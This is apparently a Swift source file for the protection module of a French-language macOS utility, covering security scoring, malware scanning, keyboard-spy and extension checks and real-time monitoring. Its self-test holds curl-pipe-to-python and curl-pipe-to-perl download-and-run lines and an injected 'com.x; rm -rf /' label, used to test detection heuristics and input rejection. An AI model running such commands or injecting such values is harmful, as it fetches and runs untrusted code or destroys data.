import Foundation
import AppKit
import Observation

enum ProtectionTab: String, CaseIterable, Identifiable {
    case security, threats, persistence, permissions, privacy, realtime

    var id: String { rawValue }

    var title: String {
        switch self {
        case .security: return "Bilan"
        case .threats: return "Menaces"
        case .persistence: return "Démarrage"
        case .permissions: return "Accès"
        case .privacy: return "Traces"
        case .realtime: return "Temps réel"
        }
    }
}

@Observable
@MainActor
final class ProtectionModel: AppModule {
    var tab: ProtectionTab = .security

    // MARK: Review
    var checks: [SecurityCheck] = []
    var pending: SecurityCheck?
    @ObservationIgnored private var pendingChecked = Date.distantPast
    var isCheckingUpdates = false
    var isAuditing = false
    var lastAudit: Date?
    /// "Renforcé" counts the stricter points too.
    var hardened = UserDefaults.standard.bool(forKey: ProtectionModel.hardenedKey) {
        didSet { if !DemoData.isEnabled { UserDefaults.standard.set(hardened, forKey: Self.hardenedKey) } }
    }
    var fixing: Set<String> = []
    var fixMessage: (ok: Bool, text: String)?
    static let hardenedKey = "protection.hardened"

    // MARK: Threats
    var threats: [ProtectionThreat] = []
    var threatSelection: Set<String> = []
    var isScanning = false
    var scanDeep = false
    var scanPhase = ""
    var scanDone = 0
    var scanTotal = 0
    var scanCurrent = ""
    var removing: Set<String> = []
    var threatMessage: (ok: Bool, text: String)?
    @ObservationIgnored private var scanFlag: CancelFlag?
    @ObservationIgnored private let summaryStore = JSONStore<ProtectionScanSummary?>("protection-scan", default: nil)
    @ObservationIgnored private let ignoredStore = JSONStore<[String]>("protection-ignored", default: [])
    var scanSummary: ProtectionScanSummary?
    var ignored: Set<String> = []

    // MARK: Access
    /// nil when macOS refuses to show the privacy databases (no Full Disk Access).
    var grants: [PermissionGrant]?
    var keyboardTaps: [ProtectionKeyboardTap] = []
    var extensions: [ProtectionBrowserExtension] = []
    var exposedPorts: [NetworkPort] = []
    var anchors: [ProtectionAnchor] = []
    var isCheckingAccess = false
    var accessChecked: Date?

    // MARK: Traces
    var traces: [PrivacyTrace] = []
    var traceSelection: Set<String> = []
    var isCleaningTraces = false
    var traceReport: RemovalReport?

    // MARK: Real time
    var realtime = ProtectionRealtimeSettings() {
        didSet {
            realtimeStore.value = realtime
            monitor.apply(realtime)
            // A watcher just turned on by the user's click: its alerts need the notifications.
            if realtime.anyOn && !oldValue.anyOn { Notifier.requestPermission() }
        }
    }
    var events: [ProtectionEvent] = []
    @ObservationIgnored private let realtimeStore = JSONStore<ProtectionRealtimeSettings>("protection-realtime", default: ProtectionRealtimeSettings())
    @ObservationIgnored private let eventsStore = JSONStore<[ProtectionEvent]>("protection-events", default: [])
    @ObservationIgnored let monitor = ProtectionMonitor()
    @ObservationIgnored weak var app: AppModel?

    @ObservationIgnored var onFreed: (Int64) -> Void = { _ in }
    /// A point of the security check fixed (its id and title), threats neutralized (their ids).
    @ObservationIgnored var onFixed: (String, String) -> Void = { _, _ in }
    @ObservationIgnored var onNeutralized: ([String]) -> Void = { _ in }

    init() {
        scanSummary = summaryStore.value
        ignored = Set(ignoredStore.value)
        events = eventsStore.value
        // Read without starting anything: the watchers start with the app (`start`), never in a snapshot or a test.
        let saved = realtimeStore.value
        if saved != realtime { realtime = saved }
        monitor.onEvent = { [weak self] event, threat in self?.record(event, threat: threat) }
    }

    // MARK: Score

    var hasAudit: Bool { !checks.isEmpty }

    var allChecks: [SecurityCheck] { checks + [pending].compactMap { $0 } }

    /// The points of the chosen level whose state is known.
    var scored: [SecurityCheck] {
        allChecks.filter { $0.scored && $0.status != .unknown && ($0.level == .essential || hardened) }
    }

    /// Weighted: a critical point counts three times a recommended one.
    var securityRatio: Double {
        let s = scored
        let total = s.reduce(0) { $0 + $1.weight }
        guard total > 0 else { return 1 }
        return Double(s.filter(\.passed).reduce(0) { $0 + $1.weight }) / Double(total)
    }

    var securityScore: Int { Int((securityRatio * 100).rounded()) }

    var grade: String {
        switch securityScore {
        case 97...: return "A+"
        case 90..<97: return "A"
        case 80..<90: return "B"
        case 65..<80: return "C"
        case 50..<65: return "D"
        default: return "E"
        }
    }

    var passedCount: Int { scored.filter(\.passed).count }
    var scoredCount: Int { scored.count }
    var issues: [SecurityCheck] {
        allChecks.filter { ($0.status == .warn || $0.status == .bad) && ($0.level == .essential || hardened) }
            .sorted { $0.weight != $1.weight ? $0.weight > $1.weight : $0.status > $1.status }
    }

    var visibleThreats: [ProtectionThreat] { threats.filter { !ignored.contains($0.id) } }
    var malware: [ProtectionThreat] { visibleThreats.filter { $0.status == .bad } }

    var sidebarBadge: String? {
        if !malware.isEmpty { return "\(malware.count) ⚠︎" }
        return issues.isEmpty ? nil : "\(issues.count)"
    }

    // MARK: Review

    func audit() async {
        guard !isAuditing else { return }
        isAuditing = true
        let running = RunningApps.snapshot()
        let (c, g, t) = await Task.detached(priority: .userInitiated) {
            (SecurityAudit.run(), TCCReader.read(), PrivacyScanner.scan(running: running))
        }.value
        checks = c
        grants = g
        traces = t
        traceSelection = Set(t.filter { $0.defaultOn && $0.blockedReason == nil && !$0.needsFullDiskAccess }.map(\.id))
        lastAudit = Date()
        isAuditing = false
        // Asked again when it failed, when updates were waiting (maybe installed since) or after an hour.
        if pending?.status != .ok || Date().timeIntervalSince(pendingChecked) > 3600 { await checkUpdates() }
    }

    func checkUpdates() async {
        guard !isCheckingUpdates else { return }
        isCheckingUpdates = true
        pending = await Task.detached(priority: .utility) { SecurityAudit.pendingUpdates() }.value
        pendingChecked = Date()
        isCheckingUpdates = false
    }

    /// Runs a point's fix (after the page's confirmation), then reads every point again.
    func apply(_ check: SecurityCheck) async {
        guard let fix = check.fix, !fixing.contains(check.id) else { return }
        fixing.insert(check.id)
        fixMessage = nil
        let error: String? = await Task.detached(priority: .userInitiated) {
            if DemoData.isEnabled { return DemoData.refusal }
            switch fix.action {
            case .admin(let command):
                let r = Shell.runAsAdmin(command)
                return r.ok ? nil : r.err
            case .user(let steps):
                for argv in steps {
                    guard let tool = argv.first else { continue }
                    let r = Shell.run(tool, Array(argv.dropFirst()))
                    // killall answers 1 when the process was not running: harmless.
                    if !r.ok && !tool.hasSuffix("killall") { return r.all.isEmpty ? "code \(r.status)" : r.all }
                }
                return nil
            }
        }.value
        ActionLog.write("PROTECTION \(fix.title) : \(error == nil ? "fait" : "échec")")
        fixing.remove(check.id)
        if let error {
            fixMessage = (false, "« \(fix.title) » n'a pas abouti : \(error.trimmingCharacters(in: .whitespacesAndNewlines))")
        } else {
            fixMessage = (true, "« \(fix.title) » : c'est fait.")
            onFixed(check.id, fix.title)
            let fresh = await Task.detached(priority: .userInitiated) { SecurityAudit.run() }.value
            if !fresh.isEmpty { checks = fresh }
        }
    }

    // MARK: Threats

    func scan(deep: Bool) async {
        guard !isScanning else { return }
        isScanning = true
        scanDeep = deep
        threatMessage = nil
        scanPhase = "Je prépare l'analyse…"
        scanDone = 0
        scanTotal = 0
        let flag = CancelFlag()
        scanFlag = flag
        let progress = ProtectionScanProgress()
        // The progress is read four times a second at most (CLAUDE.md, rule 5).
        let timer = Timer(timeInterval: 0.25, repeats: true) { [weak self] _ in
            MainActor.assumeIsolated {
                let s = progress.snapshot
                self?.scanPhase = s.phase
                self?.scanDone = s.done
                self?.scanTotal = s.total
                self?.scanCurrent = s.current
            }
        }
        timer.tolerance = 0.1
        RunLoop.main.add(timer, forMode: .common)
        let startup = app?.startup
        // Started at the same time (the full review): its list is waited for, the scan needs it.
        while startup?.isScanning == true, !Task.isCancelled { try? await Task.sleep(nanoseconds: 100_000_000) }
        guard !Task.isCancelled else {
            timer.invalidate()
            scanFlag = nil
            isScanning = false
            return
        }
        if let startup, Date().timeIntervalSince(startup.lastScan ?? .distantPast) > 300 { await startup.scan() }
        let items = startup?.items ?? []
        let result = await Task.detached(priority: .utility) {
            ProtectionThreatScanner.scan(deep: deep, launchItems: items, flag: flag, progress: progress)
        }.value
        timer.invalidate()
        scanFlag = nil
        isScanning = false
        guard let result else {
            threatMessage = flag.isCancelled ? (true, "Analyse annulée.") : (false, "Les signatures d'Apple sont introuvables sur ce Mac : analyse impossible.")
            return
        }
        threats = result.threats
        threatSelection = Set(result.threats.filter { $0.status == .bad && !$0.removable.isEmpty }.map(\.id))
        scanSummary = result.summary
        summaryStore.value = result.summary
        if !malware.isEmpty {
            Notifier.post(id: "protection.scan", title: "Analyse terminée : \(Fmt.plural(malware.count, "menace", "menaces"))",
                          body: "Ouvre Protection › Menaces pour les mettre à la Corbeille.", throttle: 60)
        }
    }

    func cancelScan() { scanFlag?.cancel() }

    var verdict: ProtectionFileVerdict?
    var isInspecting = false

    /// A file or an app the user dropped, checked before being opened.
    func inspect(_ urls: [URL]) async {
        guard let url = urls.first, !isInspecting else { return }
        isInspecting = true
        verdict = nil
        let result = await Task.detached(priority: .userInitiated) { ProtectionThreatScanner.inspect(url.path) }.value
        verdict = result
        isInspecting = false
        if let t = result.threat, !threats.contains(where: { $0.id == t.id }) {
            threats.insert(t, at: 0)
            threatSelection.insert(t.id)
        }
    }

    var selectedThreats: [ProtectionThreat] { visibleThreats.filter { threatSelection.contains($0.id) && !$0.removable.isEmpty } }

    func toggle(_ t: ProtectionThreat) {
        guard !t.removable.isEmpty else { return }
        if threatSelection.contains(t.id) { threatSelection.remove(t.id) } else { threatSelection.insert(t.id) }
    }

    func remove(_ list: [ProtectionThreat]) async {
        let chosen = list.filter { !$0.removable.isEmpty && !removing.contains($0.id) }
        guard !chosen.isEmpty else { return }
        chosen.forEach { removing.insert($0.id) }
        let reports = await Task.detached(priority: .userInitiated) { chosen.map { ($0, ProtectionThreatScanner.remove($0)) } }.value
        var failures: [String] = []
        for (t, report) in reports {
            removing.remove(t.id)
            if report.failures.isEmpty {
                threats.removeAll { $0.id == t.id }
                threatSelection.remove(t.id)
            } else {
                failures.append(t.name)
            }
        }
        let gone = reports.filter { $0.1.failures.isEmpty }.map { $0.0.id }
        if !gone.isEmpty { onNeutralized(gone) }
        await app?.startup.scan()
        if failures.isEmpty {
            threatMessage = (true, "\(Fmt.plural(chosen.count, "menace neutralisée", "menaces neutralisées")) : arrêtée\(chosen.count > 1 ? "s" : ""), et les fichiers sont dans la Corbeille (vide-la quand tu veux).")
        } else {
            threatMessage = (false, "Pas tout à fait : \(failures.joined(separator: ", ")) n'a pas pu être déplacé (protégé ou refusé). Relance l'analyse pour vérifier.")
        }
    }

    func ignore(_ t: ProtectionThreat) {
        ignored.insert(t.id)
        threatSelection.remove(t.id)
        ignoredStore.value = ignored.sorted()
    }

    func restoreIgnored() {
        ignored = []
        ignoredStore.value = []
    }

    // MARK: Access

    func checkAccess() async {
        guard !isCheckingAccess else { return }
        isCheckingAccess = true
        let (taps, ext, ports, found, g) = await Task.detached(priority: .userInitiated) {
            (ProtectionExposure.keyboardTaps(), ProtectionExposure.browserExtensions(), ProtectionExposure.exposedPorts(),
             ProtectionAnchors.scan(), TCCReader.read())
        }.value
        keyboardTaps = taps
        extensions = ext
        exposedPorts = ports
        anchors = found
        grants = g
        accessChecked = Date()
        isCheckingAccess = false
    }

    var spyingTaps: [ProtectionKeyboardTap] { keyboardTaps.filter { $0.risk != .ok } }

    // MARK: Traces

    var selectedTraces: [PrivacyTrace] {
        traces.filter { traceSelection.contains($0.id) && $0.blockedReason == nil && !$0.needsFullDiskAccess }
    }

    func toggle(_ t: PrivacyTrace) {
        guard t.blockedReason == nil, !t.needsFullDiskAccess else { return }
        if traceSelection.contains(t.id) { traceSelection.remove(t.id) } else { traceSelection.insert(t.id) }
    }

    func cleanTraces() async {
        let chosen = selectedTraces
        guard !chosen.isEmpty, !isCleaningTraces else { return }
        isCleaningTraces = true
        let report = await Task.detached(priority: .userInitiated) { PrivacyScanner.clean(chosen) }.value
        traceReport = report
        isCleaningTraces = false
        onFreed(report.freed)
        let running = RunningApps.snapshot()
        traces = await Task.detached { PrivacyScanner.scan(running: running) }.value
        traceSelection = []
    }

    // MARK: Real time

    /// The one-click switch: everything on, and the notifications asked for now (after the user's click).
    func enableRealtime() {
        Notifier.requestPermission()
        realtime = .allOn
        record(ProtectionEvent(kind: .persistence, title: "Protection en temps réel activée",
                               detail: "Démarrage, Téléchargements, caméra, micro et réglages réseau sont surveillés.", severity: Status.ok.rawValue), threat: nil)
    }

    func record(_ event: ProtectionEvent, threat: ProtectionThreat?) {
        events.insert(event, at: 0)
        if events.count > 200 { events.removeLast(events.count - 200) }
        eventsStore.value = events
        if let threat, !threats.contains(where: { $0.id == threat.id }) {
            threats.insert(threat, at: 0)
            if threat.status == .bad, !threat.removable.isEmpty { threatSelection.insert(threat.id) }
        }
    }

    func clearEvents() {
        events = []
        eventsStore.value = []
    }

    // MARK: Module

    func start(app: AppModel) {
        self.app = app
        monitor.apply(realtime)
    }

    func stop() {
        monitor.stopAll()
        eventsStore.flush()
        summaryStore.flush()
    }

    func loadDemo() {
        realtime = ProtectionRealtimeSettings(persistence: true, downloads: true, devices: true, network: false)
        events = ProtectionDemo.events()
        let scan = ProtectionDemo.threatScan(deep: false)
        threats = scan.threats
        threatSelection = Set(scan.threats.filter { $0.status == .bad }.map(\.id))
        scanSummary = scan.summary
        keyboardTaps = ProtectionDemo.keyboardTaps()
        extensions = ProtectionDemo.browserExtensions()
        exposedPorts = ProtectionDemo.exposedPorts()
        anchors = ProtectionDemo.anchors()
        accessChecked = DemoData.lastScan
    }

    var quickToggles: [QuickToggle] {
        [QuickToggle(id: "protection.realtime", title: "Protection", symbol: "shield.lefthalf.filled", isOn: realtime.anyOn) { [weak self] in
            guard let self else { return }
            if self.realtime.anyOn { self.realtime = ProtectionRealtimeSettings() } else { self.enableRealtime() }
        }]
    }

    func applySnapshotTab(_ tab: String) {
        if tab == "hardened" { hardened = true }
        if tab == "attente" {
            // The security review on its way, as before the first one finishes.
            self.tab = .security
            checks = []
            isAuditing = true
        }
        if tab == "scanning" {
            self.tab = .threats
            isScanning = true
            scanPhase = "J'analyse"
            scanDone = 1_284
            scanTotal = 3_912
            scanCurrent = "/Applications/Ruche.app/Contents/MacOS/Ruche"
        }
    }

    func commands(app: AppModel) -> [AppCommand] {
        func open(_ tab: ProtectionTab) {
            app.page = .protection
            app.protection.tab = tab
            NotificationCenter.default.post(name: .openMainWindow, object: nil)
        }
        return [
            AppCommand(id: "prot_quick_scan", title: "Rechercher les logiciels malveillants", subtitle: "Analyse rapide avec les signatures d'Apple",
                       keywords: ["virus", "malware", "antivirus", "menace", "logiciel malveillant", "xprotect", "adware"],
                       icon: .symbol("ant", Theme.bad), group: .actions, assistantSafe: true, urlSafe: true) { ctx in
                open(.threats)
                Task { await ctx.app.protection.scan(deep: false) }
                return .done
            },
            AppCommand(id: "prot_deep_scan", title: "Analyse antimalware complète", subtitle: "Tous les programmes du Mac, quelques minutes",
                       keywords: ["virus", "malware", "antivirus", "complète", "approfondie"],
                       icon: .symbol("ant.circle", Theme.bad), group: .actions, assistantSafe: true, urlSafe: true) { ctx in
                open(.threats)
                Task { await ctx.app.protection.scan(deep: true) }
                return .done
            },
            AppCommand(id: "prot_access", title: "Qui peut lire ce que je tape ?", subtitle: "Espions du clavier, extensions, ports ouverts",
                       keywords: ["keylogger", "espion", "clavier", "extensions", "ports", "caméra", "micro"],
                       icon: .symbol("keyboard.badge.eye", Theme.warn), group: .actions, assistantSafe: true, urlSafe: true) { ctx in
                open(.permissions)
                Task { await ctx.app.protection.checkAccess() }
                return .done
            },
            AppCommand(id: "prot_realtime", title: "Protection en temps réel", subtitle: "Surveiller le démarrage, les téléchargements, la caméra et le micro",
                       keywords: ["temps réel", "surveillance", "bouclier", "caméra", "micro"],
                       icon: .symbol("shield.lefthalf.filled.badge.checkmark", Theme.good), group: .actions, urlSafe: true) { _ in
                open(.realtime)
                return .done
            }
        ]
    }

    func selfTest() -> [String] {
        var f = SecurityAudit.selfTest() + ProtectionYaraChecks.run() + ProtectionAnchors.selfTest() + ProtectionExposure.selfTest()
        // The Trash for threats never reaches macOS, this app or a whole folder of the user's.
        let h = FS.home
        let files: Set<String> = [h + "/Library/Keychains/login.keychain-db", "/usr/bin/ssh", "/Library/Preferences/com.apple.x.plist",
                                  DataStore.folder + "/x", "/private/var/db/x", "/Users/autre/x", "/Library/Apple/x"]
        for p in ["/", "/System/Library/CoreServices/Finder.app", "/usr/bin/ssh", "/Library/LaunchDaemons", "/Library/Apple/x",
                  "/Applications", h, h + "/Documents", h + "/Library", h + "/Library/Keychains/login.keychain-db", "/Users/autre/x",
                  "/private/var/db/x", Bundle.main.bundlePath, DataStore.folder + "/x", "/Library/Preferences/com.apple.x.plist"]
        where Remover.isQuarantinable(p, isDirectory: !files.contains(p)) {
            f.append("Menace : « \(p) » pourrait partir à la Corbeille")
        }
        for (p, dir) in [("/Library/LaunchDaemons/com.x.plist", false), ("/Applications/Faux.app", true), (h + "/.client", false),
                         (h + "/Library/LaunchAgents/com.x.plist", false), ("/Users/Shared/AppStore.app", true), ("/private/tmp/x/agent", false),
                         ("/Library/Application Support/X/updater", false), (h + "/Downloads/Installer.app", true)]
        where !Remover.isQuarantinable(p, isDirectory: dir) {
            f.append("Menace : « \(p) » ne pourrait pas partir à la Corbeille")
        }
        // A real file in /private/tmp (standardizingPath turns it into /tmp/…), where droppers land.
        if !DemoData.isEnabled {
            let probe = "/private/tmp/heartware-quarantine-\(getpid())"
            FileManager.default.createFile(atPath: probe, contents: Data("x".utf8))
            if !Remover.isQuarantinable(probe) { f.append("Menace : un fichier de /private/tmp ne pourrait pas partir à la Corbeille") }
            try? FileManager.default.removeItem(atPath: probe)
        }
        // An agent running a script with Homebrew's python3: the script may go, never the interpreter (nor its other users).
        let job = LaunchItem(label: "local.job", plistPath: h + "/Library/LaunchAgents/local.job.plist", domain: .userAgent,
                             program: "/opt/homebrew/bin/python3", arguments: ["/opt/homebrew/bin/python3", "/opt/homebrew/bin/pip3"],
                             runAtLoad: true, keepAlive: false, disabled: false, running: false, signature: .adhoc, vendor: "",
                             appPath: nil, flags: [.downloader, .script])
        if let t = ProtectionThreatScanner.persistenceThreats([job]).first {
            if t.removable != [job.plistPath] { f.append("Menace de démarrage : l'interpréteur partirait avec elle (\(t.removable))") }
            if t.status != .warn { f.append("Menace de démarrage : un seul signal compté comme logiciel malveillant") }
        } else {
            f.append("Agent qui télécharge puis exécute du code non signalé")
        }
        for (text, bad) in [("curl -s https://api.example.com/v1 | python3 -m json.tool", false), ("curl -s https://x.example/p.py | python3", true),
                            ("curl -fsSL https://x.example/i.pl | perl -", true), ("unset DYLD_INSERT_LIBRARIES", false)]
        where (ProtectionHeuristics.isDownloader(text) || !ProtectionHeuristics.suspiciousLines(text).isEmpty) != bad {
            f.append("Heuristique \(bad ? "muette" : "déclenchée à tort") : \(text)")
        }
        if LaunchItemScanner.adminCommand(label: "com.x; rm -rf /", plist: "/Library/LaunchDaemons/com.x.plist", disable: true) != nil {
            f.append("Label dangereux accepté dans une commande administrateur")
        }
        if LaunchItemScanner.adminCommand(label: "com.example.helper", plist: "/Library/LaunchDaemons/com.example.helper.plist", disable: true) == nil {
            f.append("Label ordinaire refusé dans une commande administrateur")
        }
        // Score: a critical point weighs three times a recommended one.
        let model = ProtectionModel()
        model.checks = [SecurityCheck(id: "filevault", title: "", symbol: "", status: .bad, detail: ""),
                        SecurityCheck(id: "hints", title: "", symbol: "", status: .ok, detail: "")]
        if model.securityScore != 25 { f.append("Score de sécurité pondéré : \(model.securityScore) au lieu de 25") }
        return f
    }

    func dump() -> [String] {
        var out: [String] = []
        let model = ProtectionModel()
        model.checks = SecurityAudit.run()
        out.append("Indice \(model.securityScore)/100 (\(model.grade)) · \(model.passedCount)/\(model.scoredCount) points")
        for c in model.checks {
            out.append("\(c.status.label.padding(toLength: 11, withPad: " ", startingAt: 0)) [\(c.category.title)] \(c.title) — \(c.detail)\(c.fix.map { " · correction : \($0.title)" } ?? "")")
        }
        out.append("")
        for t in ProtectionExposure.keyboardTaps() { out.append("Clavier : \(t.name) · \(t.signature.label) · \(FS.pretty(t.path))") }
        for e in ProtectionExposure.browserExtensions() {
            out.append("Extension \(e.browser) : \(e.name)\(e.readsEverything ? " · lit tous les sites" : "")\(e.forced ? " · IMPOSÉE" : "")")
        }
        for a in ProtectionAnchors.scan() { out.append("\(a.kind.title) : \(a.name) — \(a.detail)") }
        let devices = ProtectionMonitor.devicesInUse()
        out.append("Caméra \(devices.camera ? "allumée" : "éteinte") · micro \(devices.microphone ? "allumé" : "éteint")"
                   + (devices.users.isEmpty ? "" : " par " + devices.users.joined(separator: ", ")))
        return out
    }
}
